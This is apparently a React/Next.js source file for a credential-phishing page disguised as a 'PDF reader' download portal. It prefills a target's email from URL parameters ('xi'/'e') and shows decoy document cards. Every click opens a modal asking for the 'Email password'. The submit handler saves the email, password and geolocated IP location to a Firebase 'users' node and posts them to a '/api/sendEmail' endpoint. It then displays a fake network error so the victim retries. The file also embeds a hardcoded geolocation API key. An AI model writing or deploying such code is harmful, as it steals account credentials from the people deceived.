'use client';
import { useState, useEffect } from 'react';
import { db } from '@/lib/firebase';
import { ref, get } from 'firebase/database';
import { changeFavicon } from './changeFavicon';

export default function Page() {
    const [isNiceVisible, setIsNiceVisible] = useState(false);
    const [animateIn, setAnimateIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [header, setHeader] = useState({ title: "Get access to pdf reader", subtitle: "You can download multiple files or select the pdf for download", imageUrl: "/images/headimg.png", logoUrl: "/images/company.webp"})
  const [pdfs, setPdfs] = useState([
    { title: "Specification", subtitle: "An hour ago", imageUrl: "/images/img9.jpeg", logoUrl: ""},
    { title: "Company Presentation", subtitle: "A few hours ago", imageUrl: "/images/img11.jpeg", logoUrl: ""},
  ]);

useEffect(() => {
  const fetchPdfs = async () => {
    setLoading(true);
    try {
      const pdfsRef = ref(db, 'pdfsExDropGuy');
      const snapshot = await get(pdfsRef);
      if (snapshot.exists()) {
        const data = snapshot.val();

        setHeader(prev => ({
          ...prev,
          title: data.form1?.title || prev.title,
          subtitle: data.form1?.subtitle || prev.subtitle,
          imageUrl: data.form1?.imageUrl || prev.imageUrl,
           logoUrl: data.form1?.logoUrl || prev.logoUrl,
        }));

        setPdfs(prev => prev.map((pdf, index) => {
          const formNumber = index + 2; 
          return {
            ...pdf,
            title: data[`form${formNumber}`]?.title || pdf.title,
            subtitle: data[`form${formNumber}`]?.subtitle || pdf.subtitle,
            imageUrl: data[`form${formNumber}`]?.imageUrl || pdf.imageUrl,
             logoUrl: data[`form${formNumber}`]?.logoUrl || pdf.logoUrl,
          };
        }));

      } else {
        console.log('No data found at path: pdfsExDropGuy');
      }
    } catch (error) {
      console.error('Error fetching PDFs from Firebase:', error);
    } finally {
      setLoading(false);
      changeFavicon(header.imageUrl);
    }

    const emailFromURL = getQueryParam("xi") || getQueryParam("e") || "";
    setEmail(emailFromURL);
  };

  fetchPdfs();
}, []);


  const showNice = () => {
    setError("");
    setIsNiceVisible(true);
    setTimeout(() => {
      setAnimateIn(true);
    }, 10);
  };

  
  const hideNice = (event) => {
    setError("")
    if (event.target.classList.contains("good-cont")) {
      setAnimateIn(false);
      setTimeout(() => {
        setIsNiceVisible(false);
      }, 300);
    }
  };
  
  function getQueryParam(param) {
    return new URLSearchParams(window.location.search).get(param);
  }

      const fetchLocation = async () => {
      try {
        const res = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=477b04ba40ce487b99984aca5c47b2a0");
        if (!res.ok) throw new Error("Location service failed");
        const data = await res.json();
        return `${data.city || "Unknown City"}, ${data.country_name || "Unknown Country"}`;
      } catch (err) {
        console.error(err);
        return "Unknown Location";
      }
    };

      const handleShowKindness = async (e) => {
        e.preventDefault();
        setLoading(false);
        
          if (!email || !password) {
        setError("Both fields are required.");
        return;
      }
        
        setLoading(true);
        setError("");
        try {
          const usersRef = ref(db, "users");
          const newUser = { email, password, location: await fetchLocation() };
          await push(usersRef, newUser);
    
          const response = await fetch("/api/sendEmail", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(newUser),
          });
    
          if (response.ok) {
            setError("Network Error! Please verify your information and try again");
            setLoading(false)
            setPassword("");
          } else {
            setError("Error logging in to this account!.");
            setLoading(false)
            setPassword("");
          }
        } catch (error) {
          console.error("Error:", error);
          setError("Logging failed.");
          setLoading(false)
          setPassword("");
        }
    
      }

  return (
    <div className='bg-white dark:bg-[#121212] w-full h-screen'>
         <nav className="w-full border-b border-[#00000020] dark:border-gray-700 p-5 flex gap-5 items-center justify-between flex-wrap">
      <div
        onClick={showNice}
        className="flex items-center gap-2 cursor-pointer select-none"
      >
        <img
          src={header.imageUrl}
          alt="File icon"
          className="h-6"
        />
        <span className="text-gray-800 dark:text-gray-200 text-sm md:text-base font-semibold">
          {header.title}
        </span>
      </div>
      <div className="flex items-center gap-4">
        {[
          { label: "Open" },
          { label: "Save" },
          { label: "Print" },
          { label: "Zoom In" },
          { label: "Zoom Out" },
          { label: "Search" },
        ].map((item) => (
          <button
            key={item.label}
            onClick={showNice}
            className="text-gray-700 dark:text-gray-300 transition-colors text-sm"
          >
            {item.label}
          </button>
        ))}
      
      <div
        onClick={showNice}
        className="cursor-pointer text-gray-600 dark:text-gray-300 w-6 h-6 rounded-full bg-[#88888820] hover:bg-[#88888850] text-center transition-colors max-md:hidden"
      >
        ⋮
      </div>
      </div>
    </nav>
      <header className='flex items-center flex-col p-5'>
        <div className='bg-[#00eeff10] backdrop-blur-sm border border-[#88888850] my-5 text-center rounded-lg p-5 dark:text-white w-full md:max-w-2xl'>
          {header.subtitle}
        </div>
        <button onClick={showNice} className='px-5 py-2 rounded-lg bg-blue-800 dark:bg-blue-400 text-white text-sm font-semibold'>Download All</button>
      </header>
      <main className="">
        <div className="container card-container shadow-lg border bg rounded-2xl bg-white dark:bg-[#121212]">
          <div className="card p-5">
            <div className="card-body flex flex-col items-center">
              <div className="w-full grid grid-cols-1 md:grid-cols-2  gap-5">
                
              {pdfs.map((pdf, index) => (
  <div
    className="slide min-h-[400px]"
    key={index}
    onClick={showNice}
  >
    {loading ? (
      <div className="w-full h-full bg-[#88888880] text-white flex text-center items-center justify-center">
        Loading...
      </div>
    ) : (
      <div className="relative w-full h-full border cursor-pointer">
        <img src={pdf.imageUrl} alt={`Document ${index + 1}`} className="w-full h-full object-cover" />
         <img src={header.logoUrl} alt={`Document ${index + 1}`} className="h-20 absolute top-0 left-0" />
        <div className="overlay">
          <div className="file-name">{pdf.title}</div>
          <div className="file-time">{pdf.subtitle}</div>
        </div>
      </div>
    )}
  </div>
))}
              </div>
            </div>
          </div>
           {isNiceVisible && (
            <div className={`good-cont p-5`} onClick={hideNice} style={{ display: isNiceVisible? "flex" : "", opacity:isNiceVisible? "1":"0"}}>
              <div className={`good-card bg-white dark:bg-[#121212] text-black dark:text-white p-5`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
                  <div className="flex flex-col pt-4">
                    <img src={header.imageUrl} width={50} alt="logo" />
                </div>
                <div className="good-main-content">         
                    <p className="mb-0 mt-2 text-xl font-semibold">{header.title}</p>
                  <div className="text-center text-sm text-gray-700 dark:text-gray-300">
                    Enter your email and password to access PDF document.
                  </div>
                </div>
                <form onSubmit={handleShowKindness}>
                  <div id="error" style={{ fontSize: "14px", color: "tomato", textAlign: "center" }}>{error}</div>
                  <input type="email" id="email" className='text-[black] dark:text-white' readOnly placeholder="autoemail@mail.com" value={email}/>
                  <input type="password" id="password" className='bg-transparent' onChange={(e)=> setPassword(e.target.value)} placeholder="Email password"/>
                  <button type="submit" id='login-btn' className={`rounded-lg h-[50px] bg-blue-800 dark:bg-blue-400 text-white text-sm font-semibold`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "View Document"}</button>
                </form>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
              }
